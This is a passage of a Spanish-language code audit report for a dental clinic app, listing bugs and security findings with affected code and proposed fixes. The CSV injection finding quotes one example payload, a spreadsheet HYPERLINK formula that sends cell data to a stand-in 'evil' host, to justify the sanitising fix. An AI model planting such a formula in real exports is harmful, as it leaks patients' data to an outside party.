- **Descripción del Problema:** `createAppointment` ya usa la duración real del servicio (`profile.services`), pero `getAvailableSlots` sigue generando slots con `slotDuration = 30` fijo. Para un servicio de 60/90 minutos el bot ofrece horarios donde el servicio no entra (el hueco libre es de 30 min): el paciente elige, `create_appointment` construye el turno con la duración real, el RPC detecta el solapamiento y lo rechaza — el paciente recibe un error tras haber "elegido un horario disponible".
- **Código Afectado:**

```typescript
// 4. Generate slots
const slotsArray: string[] = [];
const slotDuration = 30; // minutes
```

- **Solución Propuesta:** Pasar el servicio a la tool y usar su duración. En `toolsDefinition`, agregar el parámetro:

```typescript
{
    name: "get_available_slots",
    description: "Consulta los turnos disponibles para una fecha específica. Verifica horarios de atención y turnos ocupados.",
    parameters: {
        type: "object",
        properties: {
            date: { type: "string", description: "La fecha a consultar (formato YYYY-MM-DD)" },
            appointment_type: { type: "string", description: "Servicio a agendar (para calcular la duración real del turno)" }
        },
        required: ["date"]
    }
},
```

En la implementación:

```typescript
const getAvailableSlots = async (dateStr: string, appointmentType?: string) => {
    // ...
    const services = Array.isArray(profile?.services) ? profile.services : [];
    const matched = services.find((s: any) =>
        typeof s?.name === 'string' &&
        s.name.trim().toLowerCase() === (appointmentType || '').trim().toLowerCase()
    );
    const slotDuration = Number(matched?.duration) > 0 ? Number(matched.duration) : 30;
```

Y en el dispatcher: `fnResult = await getAvailableSlots(fnArgs.date, fnArgs.appointment_type);`

---

## [BAJO] Header.tsx: return condicional antes de useEffect (violación de las reglas de hooks)

- **Ubicación:** `src/components/Header.tsx` (Línea 29 a 31)
- **Categoría:** Crash (latente)
- **Descripción del Problema:** `if (!session?.user) return null;` está **antes** del `useEffect`. Si el componente llegara a re-renderizar con `session` en null (hoy no ocurre porque el padre lo desmonta primero, pero cualquier refactor del árbol lo habilita), React lanza "Rendered fewer hooks than expected" y crashea la vista. Es exactamente el tipo de bomba latente que `eslint-plugin-react-hooks` marca como error.
- **Código Afectado:**

```typescript
  if (!session?.user) return null;

  useEffect(() => {
    if (!session?.user) return;
```

- **Solución Propuesta:** Mover el early-return después de todos los hooks:

```typescript
  useEffect(() => {
    if (!session?.user) return;
    // ... (cuerpo actual sin cambios)
  }, [session?.user?.id]);

  // ... fetchUserData y handleLogout sin cambios ...

  if (!session?.user) return null;

  return (
    <>
```

---

## [BAJO] ProtectedRoute expulsa a usuarios pagos si falla la carga de la suscripción

- **Ubicación:** `src/router/ProtectedRoute.tsx` (Línea 33 a 39) y `src/context/SubscriptionContext.tsx` (Línea 44 a 58)
- **Categoría:** Bug Lógico
- **Descripción del Problema:** Si `fetchSubscription` falla (corte de red, error 5xx), el `catch` del contexto deja `subscription = null` y `isLoading = false`. `ProtectedRoute` trata `subscription === null` como "sin suscripción" y redirige a `/suscripcion`: un usuario con plan activo queda bloqueado de toda la app por un error transitorio, sin mensaje de error ni reintento.
- **Código Afectado:**

```typescript
const isBlocked =
  !isExempt &&
  (subscription === null || isExpired || subscription?.status === "cancelled");
```

- **Solución Propuesta:** Distinguir "no hay fila" de "falló la carga". En `SubscriptionContext`, exponer el error:

```typescript
const [loadError, setLoadError] = useState(false);

const load = useCallback(async (userId: string) => {
  setIsLoading(true);
  setLoadError(false);
  try {
    const [sub, perms] = await Promise.all([
      fetchSubscription(userId),
      fetchFeaturePermissions(userId),
    ]);
    setSubscription(sub);
    setPermissions(perms);
  } catch (err) {
    console.error("SubscriptionContext load error:", err);
    setLoadError(true);
  } finally {
    setIsLoading(false);
  }
}, []);
```

(agregar `loadError` a la interfaz y al value del provider), y en `ProtectedRoute`:

```typescript
const {
  isAdmin,
  isExpired,
  isLoading: subLoading,
  subscription,
  loadError,
} = useSubscription();
// ...
const isBlocked =
  !isExempt &&
  !loadError &&
  (subscription === null || isExpired || subscription?.status === "cancelled");
```

---

## [BAJO] Reemplazo de archivo clínico: borra el archivo viejo antes de actualizar la DB

- **Ubicación:** `src/components/ClinicalRecordModal.tsx` (Línea 164 a 184) y `src/components/ConsentimientoModal.tsx` (Línea 157 a 175)
- **Categoría:** Bug Lógico (integridad de datos)
- **Descripción del Problema:** Al reemplazar una historia clínica/consentimiento, el flujo es: subir nuevo → **borrar el viejo del Storage** → `UPDATE` en la DB. Si el `UPDATE` falla (red, RLS), el registro sigue apuntando al archivo viejo que ya fue eliminado: la referencia queda rota y el documento anterior se pierde definitivamente. El orden correcto es actualizar la DB primero y borrar el viejo al final (un huérfano temporal lo limpia el cron; una referencia rota es pérdida de datos).
- **Código Afectado:**

```typescript
if (
  oldUrl &&
  !oldUrl.startsWith("http") &&
  oldUrl !== "Sin archivo" &&
  oldUrl !== "-"
) {
  try {
    await StorageService.deleteFile(oldUrl, "clinical-records");
  } catch (deleteErrUnknown: unknown) {
    /* ... */
  }
}

const { error: updateError } = await supabase
  .from("patients")
  .update({ historia_clinica_url: newPath })
  .eq("id", patient.id)
  .eq("user_id", userId);

if (updateError)
  throw new Error(`Error al guardar en base de datos: ${updateError.message}`);
```

- **Solución Propuesta:** Invertir el orden (mismo cambio en ambos modales, ajustando el campo):

```typescript
const { error: updateError } = await supabase
  .from("patients")
  .update({ historia_clinica_url: newPath })
  .eq("id", patient.id)
  .eq("user_id", userId);

if (updateError)
  throw new Error(`Error al guardar en base de datos: ${updateError.message}`);

// Recién con la DB apuntando al archivo nuevo se borra el anterior.
// Si este delete falla solo queda un huérfano, que limpia el cron semanal.
if (
  oldUrl &&
  !oldUrl.startsWith("http") &&
  oldUrl !== "Sin archivo" &&
  oldUrl !== "-"
) {
  try {
    await StorageService.deleteFile(oldUrl, "clinical-records");
  } catch (deleteErrUnknown: unknown) {
    const deleteErr =
      deleteErrUnknown instanceof Error
        ? deleteErrUnknown
        : new Error(String(deleteErrUnknown));
    console.warn(
      "Could not delete old clinical record file, proceeding anyway:",
      deleteErr,
    );
  }
}
```

---

## [BAJO] Inyección de fórmulas CSV en las exportaciones (Excel/Sheets)

- **Ubicación:** `src/services/ExportService.ts` (Línea 2 a 13)
- **Categoría:** Seguridad
- **Descripción del Problema:** Los CSV exportados escapan comillas pero no neutralizan celdas que empiezan con `=`, `+`, `-` o `@`. Parte de los datos exportados proviene de terceros no confiables: el formulario público de reservas y el bot de WhatsApp permiten a un paciente definir su `nombre`/`obra_social`/`notas`. Un valor como `=HYPERLINK("http://evil/?"&A1;"click")` se ejecuta como fórmula cuando el dentista abre el CSV en Excel (exfiltración de datos / ejecución vía DDE en versiones viejas).
- **Código Afectado:**

```typescript
private static downloadCsv(filename: string, rows: string[][]): void {
    const csv = rows
      .map(r => r.map(cell => `"${String(cell ?? '').replace(/"/g, '""')}"`).join(','))
      .join('\n');
```

- **Solución Propuesta:**

```typescript
private static downloadCsv(filename: string, rows: string[][]): void {
    const sanitizeCell = (raw: unknown): string => {
      let value = String(raw ?? '');
      // Neutraliza fórmulas: Excel/Sheets ejecutan celdas que empiezan con = + - @
      // (los datos incluyen texto ingresado por pacientes en el booking público).
      if (/^[=+\-@\t\r]/.test(value)) value = `'${value}`;
      return `"${value.replace(/"/g, '""')}"`;
    };
    const csv = rows.map(r => r.map(sanitizeCell).join(',')).join('\n');
```

---

## [BAJO] mp-webhook inserta en payment_events antes de validar la firma

- **Ubicación:** `supabase/functions/mp-webhook/index.ts` (Línea 92 a 109)
- **Categoría:** Seguridad (DoS de tabla)
- **Descripción del Problema:** El evento crudo se inserta en `payment_events` **antes** de la verificación HMAC, en un endpoint público. Cualquiera puede llenar la tabla de auditoría con basura a voluntad (crecimiento sin límite, ruido en el panel de admin que la lista). El comentario lo declara intencional "para auditoría", pero auditar tráfico no autenticado no requiere persistirlo sin límite.
- **Código Afectado:**

```typescript
// 1) Registrar SIEMPRE el evento crudo para auditoria (antes de cualquier validacion)
await supabase.from("payment_events").insert({
  event_type: topic,
  mp_resource_id: resourceId,
  payload,
  processed: false,
});

// 2) Validacion de firma (BLOQUEANTE si MP_WEBHOOK_SECRET esta configurado).
if (MP_WEBHOOK_SECRET) {
  const validSig = await verifySignature(req, url, MP_WEBHOOK_SECRET);
  if (!validSig) {
    /* ... */
  }
}
```

- **Solución Propuesta:** Validar primero; registrar como máximo un log de consola para los rechazados:

```typescript
// 1) Validacion de firma PRIMERO: no persistir trafico no autenticado.
if (MP_WEBHOOK_SECRET) {
  const validSig = await verifySignature(req, url, MP_WEBHOOK_SECRET);
  if (!validSig) {
    console.warn("Webhook signature invalid or missing. Rejecting request.", {
      topic,
      resourceId,
    });
    return new Response("Invalid signature", { status: 401 });
  }
}

// 2) Registrar el evento ya autenticado para auditoria
await supabase.from("payment_events").insert({
  event_type: topic,
  mp_resource_id: resourceId,
  payload,
  processed: false,
});
```

---

## [BAJO] Protección de contraseñas filtradas deshabilitada en Supabase Auth

- **Ubicación:** Supabase Dashboard → Authentication → Passwords (configuración, no código)
- **Categoría:** Seguridad
- **Descripción del Problema:** El advisor de seguridad del proyecto de producción reporta `auth_leaked_password_protection` deshabilitado: Supabase puede rechazar contraseñas presentes en filtraciones conocidas (HaveIBeenPwned) y hoy no lo hace. El login por email/password acepta contraseñas comprometidas de 8+ caracteres.
- **Código Afectado:**

```text
Advisor: "Leaked Password Protection Disabled" (WARN)
Supabase Auth prevents the use of compromised passwords by checking against HaveIBeenPwned.org.
```

- **Solución Propuesta:**

```text
Supabase Dashboard → Authentication → Providers → Email → Password security:
activar "Prevent use of leaked passwords".
(Sin cambios de código; el signUp devolverá un error descriptivo que LoginView ya muestra.)
```

---

## [BAJO] Nombre de instancia de WhatsApp derivado de solo 8 caracteres del UUID

- **Ubicación:** `supabase/functions/whatsapp-manager/index.ts` (Línea 66)
- **Categoría:** Bug Lógico (colisión multitenant)
- **Descripción del Problema:** `instance_${tenant_id.split('-')[0]}` usa solo el primer segmento del UUID (32 bits). Dos usuarios cuyos UUID compartan ese prefijo obtendrían **la misma instancia de Evolution API**: el segundo "create" pisa la sesión de WhatsApp del primero y el webhook enruta los mensajes al tenant equivocado (`chat-webhook` resuelve el tenant por `whatsapp_instance`). La probabilidad es baja con pocos usuarios pero crece cuadráticamente (paradoja del cumpleaños) y el impacto es una fusión total de dos consultorios.
- **Código Afectado:**

```typescript
const instanceName = `instance_${tenant_id.split("-")[0]}`;
```

- **Solución Propuesta:** Usar el UUID completo (Evolution API acepta nombres largos). Para no romper instancias existentes, respetar la guardada en el perfil:

```typescript
// Instancia única por tenant: UUID completo, sin riesgo de colisión de prefijos.
// Se respeta la instancia ya persistida para no desconectar a usuarios existentes.
const { data: profileRow } = await supabase
  .from("profiles")
  .select("whatsapp_instance")
  .eq("id", tenant_id)
  .single();
const instanceName =
  profileRow?.whatsapp_instance || `instance_${tenant_id.replace(/-/g, "")}`;
```
